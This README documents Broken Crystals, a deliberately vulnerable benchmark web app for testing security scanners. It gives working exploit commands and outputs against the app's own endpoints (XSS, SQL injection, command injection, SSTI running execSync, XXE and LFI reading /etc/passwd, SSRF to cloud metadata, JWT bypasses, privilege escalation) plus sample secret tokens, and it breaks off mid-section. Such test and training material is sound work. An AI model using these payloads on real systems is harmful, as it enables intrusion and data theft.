## Description

Broken Crystals is a benchmark application that uses modern technologies and implements a set of common security vulnerabilities.

The application contains:

- React based web client & API: http://localhost:3000
- Node.js server that serves the React client and provides both OpenAPI and GraphQL endpoints.
  The full API documentation is available via swagger or GraphQL:
  - Swagger UI - http://localhost:3000/swagger
  - Swagger JSON file - http://localhost:3000/swagger-json
  - GraphiQL UI - http://localhost:3000/graphiql

> **Note**
> The GraphQL API does not yet support all the endpoints the REST API does.

## Building and Running the Application

Build and start local development environment with Postgres DB, MailCatcher and the app:

```bash
docker compose --file=compose.local.yml up -d
```

To rebuild the app and restart the containers:

```bash
docker compose --file=compose.local.yml up -d --build --force-recreate
```

## Running tests by [SecTester](https://github.com/NeuraLegion/sectester-js/)

In the path [`./test`](./test) you can find tests to run with Jest.

First, you have to get a [Bright API key](https://docs.brightsec.com/docs/manage-your-personal-account#manage-your-personal-api-keys-authentication-tokens), navigate to your [`.env`](.env) file, and paste your Bright API key as the value of the `BRIGHT_TOKEN` variable:

```text
BRIGHT_TOKEN=<your_API_key_here>
```

Then, you can modify a URL to your instance of the application by setting the `SEC_TESTER_TARGET` environment variable in your [`.env`](.env) file:

```text
SEC_TESTER_TARGET=http://localhost:3000
```

Finally, you can start tests with SecTester against these endpoints as follows:

```bash
npm run test:e2e
```

Full configuration & usage examples can be found in our [demo project](https://github.com/NeuraLegion/sectester-js-demo-broken-crystals);

## Vulnerabilities Overview

- **Broken JWT Authentication** - The application includes multiple endpoints that generate and validate several types of JWT tokens. The main login API, used by the UI, is utilizing one of the endpoints while others are available via direct call and described in Swagger.

  - **No Algorithm bypass** - Bypasses the JWT authentication by using the “None” algorithm (implemented in main login and API authorization code).
  - **RSA to HMAC** - Changes the algorithm to use a “HMAC” variation and signs with the public key of the application to bypass the authentication (implemented in main login and API authorization code).
  - **Invalid Signature** - Changes the signature of the JWT to something different and bypasses the authentication (implemented in main login and API authorization code).
  - **KID Manipulation** - Changes the value of the KID field in the Header of JWT to use either: (1) a static file that the application uses or (2) OS Command that echoes the key that will be signed or (3) SQL code that will return a key that will be used to sign the JWT (implemented in designated endpoint as described in Swagger).
  - **Brute Forcing Weak Secret Key** - Checks if common secret keys are used (implemented in designated endpoint as described in Swagger). The secret token is configurable via .env file and, by default, is 123.
  - **X5U Rogue Key** - Uses the uploaded certificate to sign the JWT and sets the X5U Header in JWT to point to the uploaded certificate (implemented in designated endpoint as described in Swagger).
  - **X5C Rogue Key** - The application doesn't properly check which X5C key is used for signing. When we set the X5C headers to our values and sign with our private key, authentication is bypassed (implemented in designated endpoint as described in Swagger).
  - **JKU Rogue Key** - Uses our publicly available JSON to check if JWT is properly signed after we set the Header in JWT to point to our JSON and sign the JWT with our private key (implemented in designated endpoint as described in Swagger).
  - **JWK Rogue Key** - We make a new JSON with empty values, hash it, and set it directly in the Header, and we then use our private key to sign the JWT (implemented in designated endpoint as described in Swagger).

- **Brute Force Login** - Checks if the application user is using a weak password. The default setup contains user = _admin_ with password = _admin_
  <details>
    <summary>Example Exploitation</summary>

  To demonstrate brute force login, you can use the following `curl` command:

  ```bash
  $ curl https://brokencrystals.com/api/auth/login \
  >   -H 'Content-Type: application/json' \
  >   -d '{"user":"admin","password":"admin","op":"basic"}'
  {"email":"admin","ldapProfileLink":"(&(objectClass=person)(objectClass=user)(email=admin))"}
  ```

  </details>

- **Common Files** - Tries to find common files that shouldn’t be publicly exposed (such as “phpinfo”, “.htaccess”, “ssh-key.priv”, etc…). The application contains .htaccess and nginx.conf files under the client's root directory and additional files can be added by placing them under the public/public directory and running a build of the client.
  <details>
    <summary>Example Exploitation of Common Files</summary>

  To demonstrate accessing a common file, you can use the following `curl` command:

  ```bash
  curl https://brokencrystals.com/.htaccess
  ```

  Response:

  ```text
  RewriteEngine on
  RewriteCond %{REQUEST_FILENAME} !-d
  RewriteCond %{REQUEST_FILENAME}\.php -f
  RewriteRule ^(.*)$ $1.php

  ErrorDocument 400 /error_pages/400.php
  ErrorDocument 401 /error_pages/401.php
  ErrorDocument 403 /error_pages/403.php
  ErrorDocument 404 /error_pages/404.php
  ErrorDocument 410 /error_pages/410.php
  ErrorDocument 500 /error_pages/500.php

  #Serve .htc files correctly, for IE fixes
  AddType text/x-component .htc

  php_value upload_max_filesize 10M
  php_value post_max_size 10M
  php_value max_execution_time 200
  php_value max_input_time 200
  ```

  </details>

- **Cookie Security** - Checks if the cookie has the “secure” and HTTP only flags. The application returns two cookies (session and bc-calls-counter cookie), both without secure and HttpOnly flags.

- **Cross-Site Request Forgery (CSRF)**

  - Checks if a form holds anti-CSRF tokens, misconfigured “CORS” and misconfigured “Origin” header - the application returns "Access-Control-Allow-Origin: \*" header for all requests. The behavior can be configured in the /main.ts file.
  - The same form with both authenticated and unauthenticated user - the _Email subscription_ UI forms can be used for testing this vulnerability.
    <details>
      <summary>Example of Misconfigured CORS</summary>

    ![Example of Misconfigured CORS](docs/cors.gif)

    </details>

  - Different form for an authenticated and unauthenticated user - the _Add testimonial_ form can be used for testing. The forms are only available to authenticated users.

- **Cross-Site Scripting (XSS)** -

  - **Reflective XSS** There are couple of endpoints that are vulnerable to reflective XSS:

    - Landing page with the _dummy_ query param that contains DOM content (including script), add the provided DOM will be injected into the page and script executed.
    - Landing page maptitle param that contains DOM content (including script), add the provided DOM will be injected into the page and script executed.
    - /api/testimonials/count page count param is vulnerable to reflective XSS.
    - POST to https://brokencrystals.com/api/metadata with body XML body vulnarable for reflective XSS.
    - POST to https://brokencrystals.com/api/metadata with body SVG body vulnarable for reflective XSS.

    <details>
      <summary>Reflective XSS Example Exploitation</summary>

    To demonstrate reflective XSS, you can use the following payloads:

    1. **Landing Page Dummy Query Parameter**:

       - URL: `https://brokencrystals.com/?__dummy=__<script>alert('XSS')</script>`
       - The `dummy` query parameter is directly injected into the DOM without sanitization, causing the script to execute.

    2. **Landing Page Map Title Parameter**:

       - URL: `https://brokencrystals.com/?maptitle=<script>alert('XSS')</script>`
       - The `maptitle` parameter is used in the DOM and allows script execution.

    3. **Testimonials Page Count Parameter**:
       - URL: `https://brokencrystals.com/api/testimonials/count?query=<script>alert('XSS')</script>`
       - The `query` parameter is reflected in the response without sanitization, allowing script execution.
    4. **POST to /api/metadata with XML Body**:
       - URL: `https://brokencrystals.com/api/metadata`
       - Body: `<?xml version="1.0" encoding="UTF-8"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">prompt("bright986352")</x:script><child></child>`
       - The XML body is processed and the script is executed in the response.
    5. **POST to /api/metadata with SVG Body**:
       - URL: `https://brokencrystals.com/api/metadata`
       - Body: `<svg xmlns="http://www.w3.org2000/svg" xmlns:xlink="http://www.w3.org1999/xlink" viewBox="0 0 915 585"><g<x:script xmlns:x="http://www.w3.org/1999/xhtml">prompt("bright443188")</`

    </details>

  - **Persistent XSS** can be demonstrated using add testimonial form on the landing page (for authenticated users only).

    <details>
      <summary>Persistent XSS Example Exploitation</summary>

    To demonstrate persistent XSS, you can use the following steps:

    1. Submit the following `curl` request to store the XSS payload:

       ```bash
       curl 'https://brokencrystals.com/api/testimonials' -X POST \
       -H 'authorization: AUTH_TOKEN' \
       -H 'Content-Type: application/json' \
       --data-raw '{"name":"Test User","title":"Test Title","message":"<script>alert(12345)</script>"}'
       ```

    2. Visit the testimonials page at `https://brokencrystals.com/marketplace` to observe the execution of the XSS payload.

    </details>

  - **DOM Cross-Site Scripting** - can be demonstrated by using the mailing list subscription form on the landing page. The form sends a POST request to `/api/subscriptions?email=VALUE`, and the server's response is embedded into the page without any validation on either the server or client side. This allows an attacker to inject malicious scripts into the page.
    <details>
      <summary>Example Exploitation</summary>

    To demonstrate this vulnerability, you can submit the following payload in the email field of the subscription form:

    ```html
    <script>
      alert('XSS');
    </script>
    ```

    Brobser perform a POST request to `/api/subscriptions?email=<script>alert("XSS")</script>'` with the payload in the email field.
    The server's response will include the injected script, which will be embedded into the page and executed by the browser. This can be used to execute arbitrary JavaScript code in the context of the user's session.

    Example:
    ![Example of DOM XSS Exploitation](docs/bc_dom_xss.gif)

    </details>

- **Default Login Location** - The login endpoint is available under /api/auth/login.

- **Directory Listing** - The Nginx config file under the nginx-conf directory is configured to allow directory listing.

  <details>
    <summary>Example Exploitation of Directory Listing</summary>

  To demonstrate directory traversal, you can use the following `curl` command:

  ```bash
  curl https://brokencrystals.com/vendor/
  ```

  Example Response:

  ```html
  <head>
    <title>Index of /vendor/</title>
  </head>
  <html>
    <body>
      <h1>Index of /vendor/</h1>
      <hr />
      <table style="width: max(450px, 50%);">
        <tr>
          <td>
            <a href="/">../</a>
          </td>
          <td></td>
          <td></td>
        </tr>
        <tr>
          <td>
            <a href="/vendor/bootstrap-4.1">bootstrap-4.1</a>
          </td>
          <td>4/7/2025, 8:33:43 AM</td>
        </tr>
        ...
      </table>
    </body>
  </html>
  ```

    </details>

- **File Upload** - The application allows uploading an avatar photo of the authenticated user. The server doesn't perform any sort of validation on the uploaded file.
  <details>
    <summary>Example of No Anti-Virus Protection</summary>

  Uploading an EICAR test file with the file extension changed to "exe":

  ```bash
  curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' \
    -X PUT \
    -H 'authorization: AUTH_TOKEN' \
    -H 'Content-Type: multipart/form-data; boundary=--------------------------296987379026085658617195' \
    --data-binary $'----------------------------296987379026085658617195\r\nContent-Disposition: form-data; name="admin"; filename="sample-img2ee0.exe"\r\nContent-Type: image/png\r\n\r\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\r\n----------------------------296987379026085658617195--\r\n'
  ```

  The response indicates successful upload:

  ```
  HTTP/2 200
  ```

  Successfully fetching the file shows that the server stored the file:

  ```bash
  $ curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' -H 'authorization: AITH_TOKEN'
  HTTP/2 200
  date: Wed, 26 Mar 2025 08:18:40 GMT
  content-type: application/octet-stream
  content-length: 68
  x-xss-protection: 0
  strict-transport-security: max-age=31536000; includeSubDomains
  x-content-type-options: 1
  content-security-policy: default-src  * 'unsafe-inline' 'unsafe-eval'
  set-cookie: bc-calls-counter=1742977120812
  set-cookie: connect.sid=lMiES0Dvw-Ry3lTj3y66OZz5E4yss82w.N8A90AIvE3tPkAoQfoah5KOb6PUIuw%2FqXA2Lf2HkCBU; Path=/

  X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
  ```

  </details>

- **Full Path Disclosure** - An error returned by the server includes the full path of the file where the error has occurred. The error can be triggered by passing a specially crafted value as a parameter.
  <details>
    <summary>Example of Full Path Disclosure</summary>
    ```bash
    curl  -H "x-product-name: Opal'" https://qa.brokencrystals.com/api/products/views
    ```
    Response:
    ```json
    {
      "error": "UPDATE product SET views_count = views_count + 1 WHERE name = 'Opal'' - unterminated quoted string at or near \"'Opal''\"",
      "location": "/usr/src/app/dist/products/products.controller.js"
    }
    ```
    The location field in the JSON response reveals the full internal file path: /usr/src/app/dist/products/products.controller.js. This is sensitive information that should not be exposed to users, as it provides insights into the server's directory structure.
  </details>

- **Headers Security Check** - The application is configured with misconfigured security headers. The list of headers is available in the headers.configurator.interceptor.ts file. A user can pass the _no-sec-headers_ query param to any API to prevent the server from sending the headers.

- **HTML Injection** - Both forms testimonial and mailing list subscription forms allow HTML injection.
  <details>
    <summary>Example of HTML Injection</summary>

  ![Example of HTML Injection](docs/htmli.gif)

  </details>

- **CSS Injection** - The login page is vulnerable to CSS Injections through a URL parameter: https://brokencrystals.com/userlogin?logobgcolor=transparent.
  <details>
    <summary>Example of CSS Injection</summary>
    ![Example of CSS Injection](docs/css_injection.gif)
  </details>

- **HTTP Method fuzzer** - The server supports uploading, deletion, and getting the content of a file via /put.raw addition to the URL. The actual implementation using a regular upload endpoint of the server and the /put.raw endpoint is mapped in Nginx.

- **LDAP Injection** - The login request returns an LDAP query for the user's profile, which can be used as a query parameter in /api/users/ldap _query_ query parameter. The returned query can be modified to search for other users. If the structure of the LDAP query is changed, a detailed LDAP error will be returned (with LDAP server information and hierarchy).
  <details>
    <summary>LDAP Injection Example Exploitation</summary>

  ```bash
  curl "https://brokencrystals.com/api/users/ldap?query=%28%26%28objectClass%3Dperson%29%28objectClass%3Duser%29%28email%3D%2A%29%29"
  ```

  This is a URI-encoded version of the following query:

  ```text
  https://brokencrystals.com/api/users/ldap?query=(&(objectClass=person)(objectClass=user)(email=*))
  ```

  The query retrieves information about all users with an email address, using the wildcard `*` to match any email. This demonstrates how the endpoint can be exploited to extract sensitive information from the LDAP directory.

  </details>

- **Local File Inclusion (LFI)** - The /api/files endpoint returns any file on the server from the path that is provided in the _path_ param. The UI uses this endpoint to load crystal images on the landing page.
  Additionally, the application exposes a gRPC endpoint `FileService/ReadFile` which is also vulnerable to LFI/RFI.

  <details>
    <summary>Example Exploitation</summary>

  To demonstrate file disclosure, you can use the following `curl` commands:

  1.  Accessing the `/etc/hosts` File with GET /api/file/raw

      ```bash
      curl https://brokencrystals.com/api/file/raw\?path\=/etc/hosts
      ```

      Example Response:

      ```text
      # Kubernetes-managed hosts file.
      127.0.0.1       localhost
      ::1     localhost ip6-localhost ip6-loopback
      fe00::0 ip6-localnet
      fe00::0 ip6-mcastprefix
      fe00::1 ip6-allnodes
      fe00::2 ip6-allrouters
      10.0.46.108     brokencrystals-56b48bd6f9-j4x8c

      # Entries added by HostAliases.
      127.0.0.1       postgres        keycloak-postgres       keycloak        nodejs  proxy   repeater        db      brokencrystals.local
      ```

  2.  Accessing the `/etc/hosts` File with GET /api/file/

           ```bash
           curl https://brokencrystals.com/api/file\?path\=/etc/hosts
           ```

           Example Response:

           ```text
           # Kubernetes-managed hosts file.
           127.0.0.1       localhost
           ::1     localhost ip6-localhost ip6-loopback
           fe00::0 ip6-localnet
           fe00::0 ip6-mcastprefix
           fe00::1 ip6-allnodes
           fe00::2 ip6-allrouters
           10.0.46.108     brokencrystals-56b48bd6f9-j4x8c

           # Entries added by HostAliases.
           127.0.0.1       postgres        keycloak-postgres       keycloak        nodejs  proxy   repeater        db      brokencrystals.local
           ```

  3.  Accessing the `/etc/passwd` File via gRPC `FileService/ReadFile`

      ```bash
      grpcurl -plaintext -proto src/grpc/file.proto -d '{"path": "/etc/passwd"}' localhost:5000 file.FileService/ReadFile
      ```

      </details>

- **Mass Assignment** - You can add to user admin privileges upon creating user or updating userdata. When you are creating a new user /api/users/basic you can use additional hidden field in body request { ... "isAdmin" : true }. If you are trying to edit userdata with PUT request /api/users/one/{email}/info you can add this additional field mentioned above. For checking admin permissions there is one more endpoint: /api/users/one/{email}/adminpermission.
  <details>
    <summary>Hidden Field Exploitation for Privilege Escalation</summary>
      1. Creating a Regular User

      ```bash
      curl 'https://brokencrystals.com/api/users/basic' -X POST \
        -H 'Content-Type: application/json' \
        --data-raw '{"email":"regular_user","firstName":"John","lastName":"Doe","company":"Test","cardNumber":"123","phoneNumber":"555-1234","password":"password123","op":"basic"}'
      ```

      2. Login as Regular User

      ```bash
      curl 'https://brokencrystals.com/api/auth/login' -X POST \
        -H 'Content-Type: application/json' \
        --data-raw '{"user":"regular_user","password":"password123","op":"basic"}'
      ```

      The response will contain an authorization token:

      ```
      {"auth-token":"eyJ0eXAiOiJKV1QiLCJhbGci..."}
      ```

      3. Verify No Admin Permissions for Regular User

      ```bash
      curl 'https://brokencrystals.com/api/users/one/regular_user/adminpermission' \
        -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGci...'
      ```

      Response returns `false`, indicating no admin permissions.

      4. Creating a User with Admin Privileges (Exploiting the Vulnerability)

      ```bash
      curl 'https://brokencrystals.com/api/users/basic' -X POST \
        -H 'Content-Type: application/json' \
        --data-raw '{"isAdmin":true,"email":"admin_user","firstName":"Admin","lastName":"User","company":"Test","cardNumber":"123","phoneNumber":"555-5678","password":"password123","op":"basic"}'
      ```

      5. Login as Admin User

      ```bash
      curl 'https://brokencrystals.com/api/auth/login' -X POST \
        -H 'Content-Type: application/json' \
        --data-raw '{"user":"admin_user","password":"password123","op":"basic"}'
      ```

      This will return another authorization token for the admin user.

      6. Verify Admin Permissions for the Admin User

      ```bash
      curl 'https://brokencrystals.com/api/users/one/admin_user/adminpermission' \
        -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGci...'
      ```

      Response returns `true`, confirming admin permissions have been granted.

  </details>

- **Open Database** - The index.html file includes a link to manifest URL, which returns the server's configuration, including a DB connection string.
    <details>
      <summary>Example exposed database donnection string</summary>

      ```bash
      curl http://brokencrystals.com/api/config
      ```

      The server responds with configuration details:

      ```json
      {
        "awsBucket": "https://neuralegion-open-bucket.s3.amazonaws.com",
        "sql": "postgres://bc:bc@postgres:5432/bc",
        "googlemaps": "AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ"
      }
      ```

    </details>

- **OS Command Injection** - The /api/spawn endpoint spawns a new process using the command in the _command_ query parameter. The endpoint is not referenced from UI.
  Additionally, the application exposes a gRPC endpoint `OsService/RunCommand` which is also vulnerable to OS Command Injection.

    <details>
      <summary>Example Exploitation</summary>

      To demonstrate an OS Command Injection attack, you can use the following `curl` command:

      ```bash
      $ curl 'https://brokencrystals.com/api/spawn?command=uname%20-a'
      ```

      The response includes a result of code execution:

      ```
      Linux brokencrystals-5b9b6759cb-66vvt 6.1.115-126.197.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Nov  5 17:36:57 UTC 2024 x86_64 Linux
      ```

      To demonstrate the attack via gRPC:

      ```bash
      grpcurl -plaintext -proto src/grpc/os.proto -d '{"command": "id"}' localhost:5000 os.OsService/RunCommand
      ```

    </details>

    <details>
      <summary>Another Example Exploitation on graphQL</summary>

      To demonstrate another SSTI attack, you can use the following `curl` command:

      ```bash
      curl -i -X POST -H Content-Type:application/json -H Accept:application/json 'https://brokencrystals.com/graphql' -d '{"query":"query ($getCommandResult_command: String!) { getCommandResult (command: $getCommandResult_command) }" ,"variables":{"getCommandResult_command":"/bin/cat /etc/passwd "}}'
      ```

      The response includes a result of code execution:

      ```
      {"data":{"getCommandResult":"root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000::/home/node:/bin/sh\n"}}%
      ```

    </details>

- **Secret Tokens** - The /api/secrets and /api/config contains many secret tokens returns the server's configuration, including a various of API keys.
    <details>
      <summary>Example Exploitation of Secret Tokens</summary>

      To demonstrate the exposure of secret tokens, you can use the following `curl` commands:

        ```bash
        curl https://brokencrystals.com/api/secrets
        ```

        Response:

        ```json
        {
          "codeclimate": "CODECLIMATE_REPO_TOKEN=62864c476ade6ab9d10d0ce0901ae2c211924852a28c5f960ae5165c1fdfec73",
          "facebook": "EAACEdEose0cBAHyDF5HI5o2auPWv3lPP3zNYuWWpjMrSaIhtSvX73lsLOcas5k8GhC5HgOXnbF3rXRTczOpsbNb54CQL8LcQEMhZAWAJzI0AzmL23hZByFAia5avB6Q4Xv4u2QVoAdH0mcJhYTFRpyJKIAyDKUEBzz0GgZDZD",
          "google_b64": "QUl6YhT6QXlEQnbTr2dSdEI1W7yL2mFCX3c4PPP5NlpkWE65NkZV",
          "google_oauth": "188968487735-c7hh7k87juef6vv84697sinju2bet7gn.apps.googleusercontent.com",
          "google_oauth_token": "ya29.a0TgU6SMDItdQQ9J7j3FVgJuByTTevl0FThTEkBs4pA4-9tFREyf2cfcL-_JU6Trg1O0NWwQKie4uGTrs35kmKlxohWgcAl8cg9DTxRx-UXFS-S1VYPLVtQLGYyNTfGp054Ad3ej73-FIHz3RZY43lcKSorbZEY4BI",
          "heroku": "herokudev.staging.endosome.975138 pid=48751 request_id=0e9a8698-a4d2-4925-a1a5-113234af5f60",
          "hockey_app": "HockeySDK: 203d3af93f4a218bfb528de08ae5d30ff65e1cf",
          "outlook": "https://outlook.office.com/webhook/7dd49fc6-1975-443d-806c-08ebe8f81146@a532313f-11ec-43a2-9a7a-d2e27f4f3478/IncomingWebhook/8436f62b50ab41b3b93ba1c0a50a0b88/eff4cd58-1bb8-4899-94de-795f656b4a18",
          "paypal": "access_token$production$x0lb4r69dvmmnufd$3ea7cb281754b7da7dac131ef5783321",
          "slack": "xoxo-175588824543-175748345725-176608801663-826315f84e553d482bb7e73e8322sdf3"
        }
        ```

        ```bash
        curl https://brokencrystals.com/api/config
        ```

        Response:

        ```json
        {
          "awsBucket": "https://neuralegion-open-bucket.s3.amazonaws.com",
          "sql": "postgres://bc:bc@postgres:5432/bc",
          "googlemaps": "AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ"
        }
        ```

        These responses reveal sensitive information, such as API keys, database connection strings, and other tokens, which should not be publicly accessible.

    </details>

- **Server-Side Template Injection (SSTI)** - The endpoint /api/render receives a plain text body and renders it using the doT (http://github.com/olado/dot) templating engine.
  <details>
    <summary>Server-Side Template Injection (SSTI) Example Exploitation</summary>

  To demonstrate an SSTI attack, you can use the following `curl` command:

  ```bash
  curl 'https://brokencrystals.com/api/render' -X POST -H 'Content-Type: text/plain' \
  --data-raw "{{= global.process.mainModule.require('child_process').execSync('ls -la /home') }}"
  ```

  The response includes a result of code execution - lising /home dir

  ```
  total 0
  drwxr-xr-x    1 root     root            18 Feb 20 15:27 .
  drwxr-xr-x    1 root     root            40 Mar 21 11:57 ..
  drwxr-sr-x    2 node     node             6 Feb 20 15:27 node
  ```

  </details>

- **Server-Side Request Forgery (SSRF)** - The endpoint /api/file receives the _path_ and _type_ query parameters and returns the content of the file in _path_ with Content-Type value from the _type_ parameter. The endpoint supports relative and absolute file names, HTTP/S requests, as well as metadata URLs of Azure, Google Cloud, AWS, and DigitalOcean.
  There are specific endpoints for each cloud provider as well - `/api/file/google`, `/api/file/aws`, `/api/file/azure`, `/api/file/digital_ocean`.
  <details>
    <summary>Example Exploitation of Server-Side Request Forgery (SSRF)</summary>

  To demonstrate SSRF, you can use the following `curl` commands:

  1. **Triggering a Request to an External Resource**:

     ```bash
     curl 'https://brokencrystals.com/api/file?path=https://httpbin.org/get'
     ```

     Example Response:

     ```json
     {
       "args": {},
       "headers": {
         "Accept": "application/json, text/plain, */*",
         "Accept-Encoding": "gzip, compress, deflate, br",
         "Host": "httpbin.org",
         "User-Agent": "axios/1.7.7",
         "X-Amzn-Trace-Id": "Root=1-67ea5603-2599f0b04e318fa9241a659d"
       },
       "origin": "18.212.149.236",
       "url": "https://httpbin.org/get"
     }
     ```

     This demonstrates that the server can be used to make requests to external resources.

  2. **Triggering a Request to an Internal Network Resource**:

     ```bash
     curl 'https://brokencrystals.com/api/file?path=http://169.254.169.254/latest/meta-data/ami-id'
     ```

     Example Response:

     ```text
     ami-id
     ami-launch-index
     ami-manifest-path
     block-device-mapping/
     events/
     hostname
     iam/
     instance-action
     instance-id
     instance-life-cycle
     instance-type
     local-hostname
     local-ipv4
     mac
     metrics/
     network/
     placement/
     profile
     public-hostname
     public-ipv4
     public-keys/
     reservation-id
     security-groups
     services/%
     ```

     This demonstrates that the server can access internal network resources, which could expose sensitive information.

  </details>

- **SQL injection (SQLi)** - The `/api/testimonials/count` endpoint receives and executes SQL query in the query parameter. Similarly, the `/api/products/views` endpoint utilizes the `x-product-name` header to update the number of views for a product. However, both of these parameters can be exploited to inject SQL code, making these endpoints vulnerable to SQL injection attacks.
  <details>
    <summary>SQL Injection Example Exploitation</summary>

  To demonstrate an SQL injection attack, you can use the following `curl` commands:

  ```bash
  $ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "https://brokencrystals.com/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(5)--"
  Total time: 5.687800 seconds
  ```

  This command injects a SQL query that causes the database to sleep for 5 seconds. The total time taken for the request indicates that the SQL injection was successful.

  ```bash
  $ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "https://brokencrystals.com/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(1)--"
  Total time: 1.691999 seconds
  ```

  Similar to the previous command, this one causes the database to sleep for 1 second, demonstrating the ability to manipulate the database's behavior through SQL injection.

  ```bash
  $ curl https://brokencrystals.com/api/testimonials/count?query=select%20count%28table_name%29%20as%20count%20from%20information_schema.tables
  214
  ```

  This command retrieves the count of tables in the database's information schema, showing that the injected SQL query can access and extract data from the database.

  ```
  </details>

  ```

- **Unvalidated Redirect** - The endpoint /api/goto redirects the client to the URL provided in the _url_ query parameter. The UI references the endpoint in the header (while clicking on the site's logo) and as a href source for the Terms and Services link in the footer.
  <details>
    <summary>Unvalidated Redirect Example Exploitation</summary>

  To demonstrate an unvalidated redirect attack, you can use the following `curl` command:

  ```bash
  $ curl -I "https://qa.brokencrystals.com/api/goto?url=https://example.com"
  HTTP/1.1 302 Found
  Location: https://malicious-site.com
  ```

  </details>

- **Version Control System** - The client_s build process copies SVN, GIT, and Mercurial source control directories to the client application root, and they are accessible under Nginx root.
  <details>
    <summary>Version Control System Example Exploitation</summary>

  To demonstrate the exposure of version control system files, you can use the following `curl` commands:

  1. **Accessing Git Configuration**:

     ```bash
     curl https://brokencrystals.com/.git/config
     ```

     Example Response:

     ```text
     [core]
         repositoryformatversion = 0
         filemode = true
         bare = false
         logallrefupdates = true
         ignorecase = true
         precomposeunicode = true
     ```

  2. **Accessing Mercurial Requirements**:

     ```bash
     curl https://brokencrystals.com/.hg/requires
     ```

     Example Response:

     ```text
     dotencode
     fncache
     generaldelta
     revlogv1
     sparserevlog
     store
     ```

  These responses indicate that the version control system files are publicly accessible, which can expose sensitive information about the repository.

  </details>

- **XML External Entity (XXE)** - The endpoint, POST /api/metadata, receives URL-encoded XML data in the _xml_ query parameter, processes it with enabled external entities (using `libxmljs` library) and returns the serialized DOM. Additionally, for a request that tries to load file:///etc/passwd as an entity, the endpoint returns a mocked up content of the file.
  <details>
    <summary>XXE Example Exploitation</summary>

  Additionally, the endpoint PUT /api/users/one/{email}/photo accepts SVG images, which are processed with libxml library and stored on the server, as well as sent back to the client.

  To demonstrate an XXE attack, you can use the following `curl` command:

  ```bash
  curl 'https://brokencrystals.com/api/metadata' -X POST -H 'Content-Type: text/xml' \
   --data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY nexploit_xxe SYSTEM "file://etc/passwd">]> <root> &nexploit_xxe; </root>'
  ```

  The response containse servers file://etc/passwd content

  ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE replace [
    <!ENTITY nexploit_xxe SYSTEM "file://etc/passwd">
    ]>
    <root>  root:x:0:0:root:/root:/bin/sh
            bin:x:1:1:bin:/bin:/sbin/nologin
            daemon:x:2:2:daemon:/sbin:/sbin/nologin
            lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
            sync:x:5:0:sync:/sbin:/bin/sync
            shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
            halt:x:7:0:halt:/sbin:/sbin/halt
            mail:x:8:12:mail:/var/mail:/sbin/nologin
            news:x:9:13:news:/usr/lib/news:/sbin/nologin
            uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
            cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
            ftp:x:21:21::/var/lib/ftp:/sbin/nologin
            sshd:x:22:22:sshd:/dev/null:/sbin/nologin
            games:x:35:35:games:/usr/games:/sbin/nologin
            ntp:x:123:123:NTP:/var/empty:/sbin/nologin
            guest:x:405:100:guest:/dev/null:/sbin/nologin
            nobody:x:65534:65534:nobody:/:/sbin/nologin
            node:x:1000:1000::/home/node:/bin/sh
    </root>
  ```

  </details>

- **Hidden Upload (File Upload + XSS)** - `/hidden-upload` lets users supply a filename that is injected into the DOM without sanitization and upload images (including raw SVG) to `/api/hidden-upload`, which stores them and returns data URLs.

  <details>
    <summary>Demo of Hidden Upload XSS</summary>
  - Go to `/hidden-upload`, set filename to `<img src=x onerror=alert(1)>`, and upload an SVG; the filename is injected as HTML and the SVG is returned as a data URL.

  </details>

  <details>
    <summary>Demo of Hidden Upload File Upload</summary>
  - Upload any image (including crafted SVG) to `/hidden-upload`; the backend stores it under `uploads/hidden` and returns a data URL without further validation of content.

  </details>

- **Remote File Inclusion (Safe Files)** - `/api/safe-files` fetches and returns content from user-provided URLs, enabling RFI despite minimal host allowlisting.

  <details>
    <summary>Demo of Safe Files RFI</summary>
  - POST `{ "name": "test", "url": "https://filedealer.nexploit.app/rfi.md5.txt" }` to `/api/safe-files` to have the server fetch and return remote content.

  </details>

- **SQL Injection (Products Search)** - `/api/products/search?name=` interpolates the `name` parameter directly into a SQL query, allowing injection.

  <details>
    <summary>Demo of Products SQL Injection</summary>
  - Call `/api/products/search?name=' OR 1=1 --` to dump all products due to unsanitized interpolation.

  </details>

- **Broken Object Property Level Authorization (BOPLA)** - `/api/users/me` GET/PUT expose and update the authenticated user object wholesale, allowing overwriting sensitive fields (including password) without proper field-level authorization.

  <details>
    <summary>Demo of /api/users/me BOPLA</summary>
